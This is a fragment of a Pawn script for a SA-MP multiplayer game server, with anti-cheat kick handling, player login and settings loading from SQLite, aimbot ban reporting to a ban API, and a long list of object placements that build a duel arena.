public OnACFileModified(playerid, file[]) {
	if(!IsPlayerConnected(playerid)) return 1;
    if(Player[playerid][IsGettingKicked] == true) return 1;
    if(AllowStartBase == false) return 1;

	new iString[400];
	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has been kicked for using modified: {FFFFFF}%s", Player[playerid][Name], file);
	SendClientMessageToAll(-1, iString);

	SendClientMessage(playerid, -1, "{FFFFFF}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
	format(iString, sizeof(iString), ""COL_PRIM"Once you replaced your modified {FFFFFF}%s "COL_PRIM"by the original one, please {FFFFFF}RESTART "COL_PRIM"the Anti-Cheat.", file);
	SendClientMessage(playerid, -1, iString);
    SendClientMessage(playerid, -1, ""COL_PRIM"You can get original files from: {FFFFFF}http://sixtytiger.com/tiger/ac_files/unmodded_files/");
    SendClientMessage(playerid, -1, "{FFFFFF}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");

	iString = "";
	strcat(iString, "{FFFFFF}You are either kicked for running mods that are not allowed or your Anti-Cheat is not ready yet.\nIf your Anti-Cheat didn't say \"You are ready to play now\" then please wait for it.");
	strcat(iString, "\n\nDownload Link for AC:\n\nhttp://sixtytiger.com/tiger/ac_files/\n\n Install and run the AC, wait for it to say \"You are ready to play now.\"\nMake sure its up to date (Latest Version).");
    ShowPlayerDialog(playerid,DIALOG_ANTICHEAT,DIALOG_STYLE_MSGBOX,"{FF0000}Anti-Cheat", iString,"OK","");

    printf("Player: %s (%d) has been kicked for using modified %s", Player[playerid][Name], playerid, file);

    Player[playerid][IsGettingKicked] = true;
	SetTimerEx("KickForAC", 1000, false, "i", playerid);

	return 1;
}

public OnACToggled(bool:set) {
    AntiCheat = set;

    //new newhostname[128];

    if(set) {
		//format(newhostname, sizeof(newhostname), "hostname %s [AC]", hostname);
		AC_GetAllInfo();
	} //else {
	    //format(newhostname, sizeof(newhostname), "hostname %s", hostname);
	//}
	//SendRconCommand(newhostname);
}

forward OnACStart();
public OnACStart() {
	AC_Toggle(true);
	TextDrawSetString(ACText, sprintf("%sAC v2: ~g~      ON", MAIN_TEXT_COLOUR));
	//printf("AC is on.");
}


forward KickForAC(playerid);
public KickForAC(playerid) {
    Player[playerid][IsKicked] = true;
	Kick(playerid);
	return 1;
}

#endif

LoginPlayer(playerid, DBResult:res)
{
    new iString[128];

    // Load level
    db_get_field_assoc(res, "Level", iString, sizeof(iString));
    Player[playerid][Level] = strval(iString);

	// Load Weather
	db_get_field_assoc(res, "Weather", iString, sizeof(iString));
	Player[playerid][Weather] = strval(iString);

	// Load time
	db_get_field_assoc(res, "Time", iString, sizeof(iString));
	Player[playerid][Time] = strval(iString);

	// Load ChatChannel
	db_get_field_assoc(res, "ChatChannel", iString, sizeof(iString));
	Player[playerid][ChatChannel] = strval(iString);

	// Load NetCheck
	db_get_field_assoc(res, "NetCheck", iString, sizeof(iString));
	Player[playerid][NetCheck] = strval(iString);

	// Load WideScreen
	db_get_field_assoc(res, "Widescreen", iString, sizeof(iString));
	Player[playerid][TextPos] = (strval(iString) == 0 ? false : true);

	// Load HitSound
	db_get_field_assoc(res, "HitSound", iString, sizeof(iString));
	Player[playerid][HitSound] = strval(iString);

	// Load GetHitSound
	db_get_field_assoc(res, "GetHitSound", iString, sizeof(iString));
	Player[playerid][GetHitSound] = strval(iString);

	// Load Duels won
	db_get_field_assoc(res, "DWon", iString, sizeof(iString));
	Player[playerid][DuelsWon] = strval(iString);

	// Load Duels Lost
	db_get_field_assoc(res, "DLost", iString, sizeof(iString));
	Player[playerid][DuelsLost] = strval(iString);

	// Load ShowSpecs
	db_get_field_assoc(res, "ShowSpecs", iString, sizeof(iString));
	Player[playerid][ShowSpecs] = (strval(iString) == 0 ? false : true);

	
	// Load Style
	db_get_field_assoc(res, "Style", iString, sizeof(iString));
	Player[playerid][Style] = strval(iString);
	
	
	// Load Fighting Style
	db_get_field_assoc(res, "FightStyle", iString, sizeof(iString));
	Player[playerid][FightStyle] = strval(iString);
	SetPlayerFightingStyle(playerid, Player[playerid][FightStyle]);
	
	// Load Death Messages
	db_get_field_assoc(res, "DeathMessage", iString, sizeof(iString));
	format(DeathMessageStr[playerid], 64, "%s", iString);
	
	// Get current IP address
	new IP[MAX_PLAYER_NAME];
	GetPlayerIp(playerid, IP, sizeof(IP));

	// Update players table with new IP address for auto login if they reconnect.
	format(iString, sizeof(iString), "UPDATE `Players` SET `IP` = '%s' WHERE `Name` = '%s'", IP, Player[playerid][Name]);
	db_free_result(db_query(sqliteconnection, iString));


    Player[playerid][Logged] = true;

	SetTimerEx("SpawnConnectedPlayer", 250, 0, "dd", playerid, 0);
}

stock SendErrorMessage(playerid, text[])
{
	new str[160];
	format(str,sizeof(str),"{FFFFFF}ERROR:"COL_PRIM" %s",text);
    SendClientMessage(playerid,-1,str);
	return 1;
}

stock SendUsageMessage(playerid, text[])
{
	new str[160];
    format(str,sizeof(str),"{FFFFFF}USAGE:"COL_PRIM" %s",text);
    SendClientMessage(playerid,-1,str);
	return 1;
}

#define AIMBOT_BAN_OFFSET       10000

stock AddAimbotBan(playerid) {
    new post[128], IP[MAX_PLAYER_NAME];
    GetPlayerIp(playerid, IP, sizeof(IP));
	format(post, sizeof(post), "IP=%s&Name=%s", IP, Player[playerid][Name]);
	HTTP(playerid + AIMBOT_BAN_OFFSET, HTTP_POST, "gator3016.hostgator.com/~maarij94/attdef-api/aimbot_bans.php", post, "OnAimbotResponse");
}

forward OnAimbotResponse(index, response_code, data[]);
public OnAimbotResponse(index, response_code, data[]) {
	new i = index - AIMBOT_BAN_OFFSET;

	BanEx(i, "Aimbot");

	new iString[256];
	format(iString, sizeof(iString), "{FFFFFF}** System ** "COL_PRIM"has banned {FFFFFF}%s "COL_PRIM"| Reason: {FFFFFF}Aimbot (Not a bug)", Player[i][Name]);
	SendClientMessageToAll(-1, iString);
}

stock udb_hash(buf[]) {
    new length=strlen(buf);
    new s1 = 1;
    new s2 = 0;
    new n;
    for (n=0; n<length; n++)
    {
       s1 = (s1 + buf[n]) % 65521;
       s2 = (s2 + s1)     % 65521;
    }
    return (s2 << 16) + s1;
}

forward akaResponse(index, response_code, data[]);
public akaResponse(index, response_code, data[]) {
	if(response_code != 200) {
	    UpdateAKA = false;
	}

	if(!strcmp(data, "turnoff", true)) {
		UpdateAKA = false;
	}
}

CreateDuelArena()
{
	new tmpobjid;

	tmpobjid = CreateObject(13607,-2927.660,1767.998,15.176,0.000,0.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 3904, "libertyfar", "newtenmt1", 0);
	SetObjectMaterial(tmpobjid, 1, 4003, "cityhall_tr_lan", "sl_griddyfence_sml", 0);
	SetObjectMaterial(tmpobjid, 2, 9583, "bigshap_sfw", "shipfloor_sfw", 0);
	tmpobjid = CreateObject(18981,-2880.877,1802.644,20.637,0.000,0.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2880.877,1777.644,20.637,0.000,0.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2880.877,1752.644,20.637,0.000,0.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2880.877,1732.644,20.637,0.000,0.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2973.877,1802.644,20.637,0.000,0.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2973.877,1777.644,20.637,0.000,0.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2973.877,1752.644,20.637,0.000,0.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2973.877,1732.644,20.637,0.000,0.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2960.877,1814.644,20.637,0.000,-0.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2935.877,1814.644,20.637,0.000,-0.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2910.877,1814.644,20.637,0.000,-0.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2893.877,1814.644,20.637,0.000,-0.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2960.877,1720.644,20.637,0.000,-0.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2935.877,1720.644,20.637,0.000,-0.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2910.877,1720.644,20.637,0.000,-0.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2893.877,1720.644,20.637,0.000,-0.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2961.889,1732.635,33.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2961.889,1757.635,33.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2961.889,1782.635,33.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2961.889,1802.635,33.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2936.889,1732.635,33.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2936.889,1757.635,33.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2936.889,1782.635,33.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2936.889,1802.635,33.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2911.889,1732.635,33.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2911.889,1757.635,33.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2911.889,1782.635,33.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2911.889,1802.635,33.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2892.888,1732.635,33.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2892.888,1757.635,33.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2892.888,1782.635,33.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2892.888,1802.635,33.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2961.889,1732.635,8.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2961.889,1757.635,8.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2961.889,1782.635,8.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2961.889,1802.635,8.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2936.889,1732.635,8.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2936.889,1757.635,8.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2936.889,1782.635,8.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2936.889,1802.635,8.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2911.889,1732.635,8.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2911.889,1757.635,8.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2911.889,1782.635,8.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2911.889,1802.635,8.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2892.888,1732.635,8.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2892.888,1757.635,8.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2892.888,1782.635,8.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(18981,-2892.888,1802.635,8.137,0.000,-90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 8399, "vgs_shops", "vgsclubwall08_256", -10066330);
	tmpobjid = CreateObject(19458,-2922.751,1722.603,18.637,0.000,90.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 14581, "ab_mafiasuitea", "walp45S", 0);
	tmpobjid = CreateObject(19458,-2932.351,1722.603,18.637,0.000,90.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 14581, "ab_mafiasuitea", "walp45S", 0);
	tmpobjid = CreateObject(19458,-2922.751,1726.103,18.637,0.000,90.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 14581, "ab_mafiasuitea", "walp45S", 0);
	tmpobjid = CreateObject(19458,-2932.351,1726.103,18.637,0.000,90.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 14581, "ab_mafiasuitea", "walp45S", 0);
	tmpobjid = CreateObject(19458,-2922.751,1809.203,18.637,0.000,90.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 14581, "ab_mafiasuitea", "walp45S", 0);
	tmpobjid = CreateObject(19458,-2932.351,1809.203,18.637,0.000,90.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 14581, "ab_mafiasuitea", "walp45S", 0);
	tmpobjid = CreateObject(19458,-2922.751,1812.703,18.637,0.000,90.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 14581, "ab_mafiasuitea", "walp45S", 0);
	tmpobjid = CreateObject(19458,-2932.351,1812.703,18.637,0.000,90.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 14581, "ab_mafiasuitea", "walp45S", 0);
	tmpobjid = CreateObject(19458,-2968.201,1772.753,18.637,-0.000,90.000,-179.999,300.0000);
	SetObjectMaterial(tmpobjid, 0, 14581, "ab_mafiasuitea", "walp45S", 0);
	tmpobjid = CreateObject(19458,-2968.201,1763.153,18.637,-0.000,90.000,-179.999,300.0000);
	SetObjectMaterial(tmpobjid, 0, 14581, "ab_mafiasuitea", "walp45S", 0);
	tmpobjid = CreateObject(19458,-2971.701,1772.753,18.637,-0.000,90.000,-179.999,300.0000);
	SetObjectMaterial(tmpobjid, 0, 14581, "ab_mafiasuitea", "walp45S", 0);
	tmpobjid = CreateObject(19458,-2971.701,1763.153,18.637,-0.000,90.000,-179.999,300.0000);
	SetObjectMaterial(tmpobjid, 0, 14581, "ab_mafiasuitea", "walp45S", 0);
	tmpobjid = CreateObject(19458,-2883.201,1772.753,18.637,-0.000,90.000,-179.999,300.0000);
	SetObjectMaterial(tmpobjid, 0, 14581, "ab_mafiasuitea", "walp45S", 0);
	tmpobjid = CreateObject(19458,-2883.201,1763.153,18.637,-0.000,90.000,-179.999,300.0000);
	SetObjectMaterial(tmpobjid, 0, 14581, "ab_mafiasuitea", "walp45S", 0);
	tmpobjid = CreateObject(19458,-2886.701,1772.753,18.637,-0.000,90.000,-179.999,300.0000);
	SetObjectMaterial(tmpobjid, 0, 14581, "ab_mafiasuitea", "walp45S", 0);
	tmpobjid = CreateObject(19458,-2886.701,1763.153,18.637,-0.000,90.000,-179.999,300.0000);
	SetObjectMaterial(tmpobjid, 0, 14581, "ab_mafiasuitea", "walp45S", 0);
	tmpobjid = CreateObject(19458,-2922.751,1722.603,22.137,0.000,90.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 2591, "ab_partition1", "ab_fabricCheck2", 0);
	tmpobjid = CreateObject(19458,-2932.351,1722.603,22.137,0.000,90.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 2591, "ab_partition1", "ab_fabricCheck2", 0);
	tmpobjid = CreateObject(19458,-2922.751,1726.103,22.137,0.000,90.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 2591, "ab_partition1", "ab_fabricCheck2", 0);
	tmpobjid = CreateObject(19458,-2932.351,1726.103,22.137,0.000,90.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 2591, "ab_partition1", "ab_fabricCheck2", 0);
	tmpobjid = CreateObject(19458,-2922.751,1809.203,22.137,0.000,90.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 2591, "ab_partition1", "ab_fabricCheck2", 0);
	tmpobjid = CreateObject(19458,-2932.351,1809.203,22.137,0.000,90.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 2591, "ab_partition1", "ab_fabricCheck2", 0);
	tmpobjid = CreateObject(19458,-2922.751,1812.703,22.137,0.000,90.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 2591, "ab_partition1", "ab_fabricCheck2", 0);
	tmpobjid = CreateObject(19458,-2932.351,1812.703,22.137,0.000,90.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 2591, "ab_partition1", "ab_fabricCheck2", 0);
	tmpobjid = CreateObject(19458,-2968.201,1772.753,22.137,-0.000,90.000,-179.999,300.0000);
	SetObjectMaterial(tmpobjid, 0, 2591, "ab_partition1", "ab_fabricCheck2", 0);
	tmpobjid = CreateObject(19458,-2968.201,1763.153,22.137,-0.000,90.000,-179.999,300.0000);
	SetObjectMaterial(tmpobjid, 0, 2591, "ab_partition1", "ab_fabricCheck2", 0);
	tmpobjid = CreateObject(19458,-2971.701,1772.753,22.137,-0.000,90.000,-179.999,300.0000);
	SetObjectMaterial(tmpobjid, 0, 2591, "ab_partition1", "ab_fabricCheck2", 0);
	tmpobjid = CreateObject(19458,-2971.701,1763.153,22.137,-0.000,90.000,-179.999,300.0000);
	SetObjectMaterial(tmpobjid, 0, 2591, "ab_partition1", "ab_fabricCheck2", 0);
	tmpobjid = CreateObject(19458,-2883.201,1772.753,22.137,-0.000,90.000,-179.999,300.0000);
	SetObjectMaterial(tmpobjid, 0, 2591, "ab_partition1", "ab_fabricCheck2", 0);
	tmpobjid = CreateObject(19458,-2883.201,1763.153,22.137,-0.000,90.000,-179.999,300.0000);
	SetObjectMaterial(tmpobjid, 0, 2591, "ab_partition1", "ab_fabricCheck2", 0);
	tmpobjid = CreateObject(19458,-2886.701,1772.753,22.137,-0.000,90.000,-179.999,300.0000);
	SetObjectMaterial(tmpobjid, 0, 2591, "ab_partition1", "ab_fabricCheck2", 0);
	tmpobjid = CreateObject(19458,-2886.701,1763.153,22.137,-0.000,90.000,-179.999,300.0000);
	SetObjectMaterial(tmpobjid, 0, 2591, "ab_partition1", "ab_fabricCheck2", 0);
	tmpobjid = CreateObject(19458,-2888.351,1772.739,20.423,0.000,0.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 16640, "a51", "a51_glass", 0);
	tmpobjid = CreateObject(19458,-2888.351,1763.139,20.423,0.000,0.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 16640, "a51", "a51_glass", 0);
	tmpobjid = CreateObject(19458,-2966.561,1772.739,20.423,0.000,0.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 16640, "a51", "a51_glass", 0);
	tmpobjid = CreateObject(19458,-2966.561,1763.139,20.423,0.000,0.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 16640, "a51", "a51_glass", 0);
	tmpobjid = CreateObject(19458,-2922.748,1807.547,20.323,0.000,0.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 16640, "a51", "a51_glass", 0);
	tmpobjid = CreateObject(19458,-2932.347,1807.547,20.323,0.000,0.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 16640, "a51", "a51_glass", 0);
	tmpobjid = CreateObject(19366,-2968.259,1758.453,20.323,0.000,0.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 16640, "a51", "a51_glass", 0);
	tmpobjid = CreateObject(19458,-2922.748,1727.747,20.323,0.000,0.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 16640, "a51", "a51_glass", 0);
	tmpobjid = CreateObject(19458,-2932.347,1727.747,20.323,0.000,0.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 16640, "a51", "a51_glass", 0);
	tmpobjid = CreateObject(19366,-2968.259,1777.483,20.323,0.000,0.000,90.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 16640, "a51", "a51_glass", 0);
	tmpobjid = CreateObject(19366,-2886.858,1777.453,20.323,-0.000,0.000,-89.999,300.0000);
	SetObjectMaterial(tmpobjid, 0, 16640, "a51", "a51_glass", 0);
	tmpobjid = CreateObject(19366,-2886.858,1758.423,20.323,-0.000,0.000,-89.999,300.0000);
	SetObjectMaterial(tmpobjid, 0, 16640, "a51", "a51_glass", 0);
	tmpobjid = CreateObject(19366,-2937.079,1809.063,20.323,0.000,0.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 16640, "a51", "a51_glass", 0);
	tmpobjid = CreateObject(19366,-2918.029,1809.063,20.323,0.000,0.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 16640, "a51", "a51_glass", 0);
	tmpobjid = CreateObject(19366,-2918.029,1726.234,20.323,0.000,-0.000,-179.999,300.0000);
	SetObjectMaterial(tmpobjid, 0, 16640, "a51", "a51_glass", 0);
	tmpobjid = CreateObject(19366,-2937.079,1726.234,20.323,0.000,-0.000,-179.999,300.0000);
	SetObjectMaterial(tmpobjid, 0, 16640, "a51", "a51_glass", 0);
	tmpobjid = CreateObject(13607,-2927.660,1767.998,3.976,0.000,180.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 16640, "a51", "a51_glass", 16711680);
	SetObjectMaterial(tmpobjid, 1, 4003, "cityhall_tr_lan", "sl_griddyfence_sml", 16711680);
	SetObjectMaterial(tmpobjid, 2, -1, "none", "none", 16711680);
	tmpobjid = CreateObject(19377,-2924.969,1766.626,27.037,0.000,90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, -1, "none", "none", -10066330);
	tmpobjid = CreateObject(19377,-2931.169,1766.626,27.037,0.000,90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, -1, "none", "none", -10066330);
	tmpobjid = CreateObject(19377,-2924.969,1773.726,27.037,0.000,90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, -1, "none", "none", -10066330);
	tmpobjid = CreateObject(19377,-2931.169,1773.726,27.037,0.000,90.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, -1, "none", "none", -10066330);
	tmpobjid = CreateObject(13607,-2927.660,1767.998,15.176,0.000,0.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 3904, "libertyfar", "newtenmt1", 0);
	SetObjectMaterial(tmpobjid, 1, 4003, "cityhall_tr_lan", "sl_griddyfence_sml", 0);
	SetObjectMaterial(tmpobjid, 2, 9583, "bigshap_sfw", "shipfloor_sfw", 0);
	tmpobjid = CreateObject(13607,-2927.660,1767.998,15.176,0.000,0.000,0.000,300.0000);
	SetObjectMaterial(tmpobjid, 0, 3555, "comedhos1_la", "comptwindo1", 0);
	SetObjectMaterial(tmpobjid, 1, 4003, "cityhall_tr_lan", "sl_griddyfence_sml", 0);
	SetObjectMaterial(tmpobjid, 2, 9583, "bigshap_sfw", "shipfloor_sfw", 0);
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	tmpobjid = CreateObject(19366,-2971.458,1758.423,20.323,0.000,0.000,90.000,300.0000);
	tmpobjid = CreateObject(19366,-2974.658,1758.423,20.323,0.000,0.000,90.000,300.0000);
	tmpobjid = CreateObject(19366,-2971.458,1777.483,20.323,0.000,0.000,90.000,300.0000);
	tmpobjid = CreateObject(19366,-2883.658,1777.483,20.323,-0.000,0.000,-89.999,300.0000);
	tmpobjid = CreateObject(19366,-2974.658,1777.483,20.323,0.000,0.000,90.000,300.0000);
	tmpobjid = CreateObject(19366,-2880.458,1777.483,20.323,-0.000,0.000,-89.999,300.0000);
	tmpobjid = CreateObject(19366,-2883.658,1758.423,20.323,-0.000,0.000,-89.999,300.0000);
	tmpobjid = CreateObject(19366,-2880.458,1758.423,20.323,-0.000,0.000,-89.999,300.0000);
	tmpobjid = CreateObject(19366,-2937.079,1812.263,20.323,0.000,0.000,0.000,300.0000);
	tmpobjid = CreateObject(19366,-2937.079,1815.463,20.323,0.000,0.000,0.000,300.0000);
	tmpobjid = CreateObject(19366,-2918.029,1812.263,20.323,0.000,0.000,0.000,300.0000);
	tmpobjid = CreateObject(19366,-2918.029,1815.463,20.323,0.000,0.000,0.000,300.0000);
	tmpobjid = CreateObject(19366,-2918.029,1723.034,20.323,0.000,-0.000,-179.999,300.0000);
	tmpobjid = CreateObject(19366,-2918.029,1719.834,20.323,0.000,-0.000,-179.999,300.0000);
	tmpobjid = CreateObject(19366,-2937.079,1723.034,20.323,0.000,-0.000,-179.999,300.0000);
	tmpobjid = CreateObject(19366,-2937.079,1719.834,20.323,0.000,-0.000,-179.999,300.0000);
	tmpobjid = CreateObject(18980,-2969.200,1763.359,6.057,0.000,0.000,0.000,300.0000);
	tmpobjid = CreateObject(18980,-2969.200,1773.159,6.057,0.000,0.000,0.000,300.0000);
	tmpobjid = CreateObject(18980,-2886.100,1763.359,6.057,0.000,0.000,0.000,300.0000);
